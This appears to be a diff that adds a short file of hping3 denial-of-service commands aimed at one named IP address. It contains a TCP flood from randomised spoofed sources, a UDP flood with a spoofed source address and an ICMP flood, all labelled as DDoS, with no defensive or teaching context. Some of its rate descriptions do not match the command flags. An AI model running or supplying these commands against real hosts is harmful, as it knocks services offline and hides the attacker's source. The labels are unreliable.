@@ -1,0 +1,4 @@
+Props IP : 138.197.149.203
+10,000 TCP package for DDOS :  hping3 -c 10000 --flood --rand-source 138.197.149.203
+9,000 UDP packets in 90 seconds spoofed source address  hping3 -c 9000 --flood -a 159.203.39.47 138.197.149.203
+11,000 ICMP packets with a data size of 1KB in 75 packets per second hping3 -c 11000 -i u1000000 --icmp -d 1000 --rand-source 138.197.149.203
